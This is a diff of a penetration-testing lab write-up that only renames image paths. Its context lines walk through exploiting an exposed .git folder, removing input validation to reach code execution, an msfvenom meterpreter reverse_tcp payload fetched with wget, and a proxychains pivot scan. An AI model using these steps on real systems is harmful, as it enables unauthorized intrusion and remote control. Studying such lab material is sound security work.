@@ -75,7 +75,7 @@ One thing that stood out in the nmap scan was this file path
 
 When you visit /.git itself, you receive an error
 
-![](<../../../../.gitbook/assets/image (46) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (46) (1) (1) (1) (1).png>)
 
 However, visiting .git/config gives you a file to download
 
@@ -125,7 +125,7 @@ These first two files seem to be the code that's running on port 800
 
 However we're more interested in this .git folder
 
-![](<../../../../.gitbook/assets/image (16) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (16) (1) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (54) (1) (1) (1) (1) (1).png>)
 
@@ -143,7 +143,7 @@ These are , however, fixed. Yet, we can use the following command to view the di
 git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
 ```
 
-![](<../../../../.gitbook/assets/image (26) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (26) (1) (1) (1).png>)
 
 Reading the code here tells us that the send\_from\_directory function sends any file from the server and if the requested path contains `..` or `%2E`, a 404 response is returned
 
@@ -161,7 +161,7 @@ We, however, want remote code execution, so we will modify the code in the API.p
 
 Comment out the part where there's input validation and commit this change to the repository
 
-![](<../../../../.gitbook/assets/image (31) (1).png>)
+![](<../../../../.gitbook/assets/image (31) (1) (1).png>)
 
 ```
 git status
@@ -250,13 +250,13 @@ We'll essentially need to generate a payload with msfvenom, upload the payload t
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.250.81.2 LPORT=9999 -f elf > reverse.elf
 ```
 
-![](<../../../../.gitbook/assets/image (44) (1).png>)
+![](<../../../../.gitbook/assets/image (44) (1) (1).png>)
 
 We'll start an http server on our host and use wget on the compromised host to download the payload and then start a listener with Metasploit
 
 ![Used python to host our directory containing the payload](<../../../../.gitbook/assets/image (10) (1).png>)
 
-![Used wget to download the payload onto the compromised machine](<../../../../.gitbook/assets/image (45) (1).png>)
+![Used wget to download the payload onto the compromised machine](<../../../../.gitbook/assets/image (45) (1) (1).png>)
 
 After starting Metasploit, we'll enter the following commands
 
@@ -331,7 +331,7 @@ proxychains nmap -sT -P0 192.218.10.2
 
 Now these ports are open!
 
-![](<../../../../.gitbook/assets/image (52) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (52) (1) (1) (1).png>)
 
 In the solution, port 8080 is supposed to be open. Even after following the solution step by step, I never got an open port 8080.
 
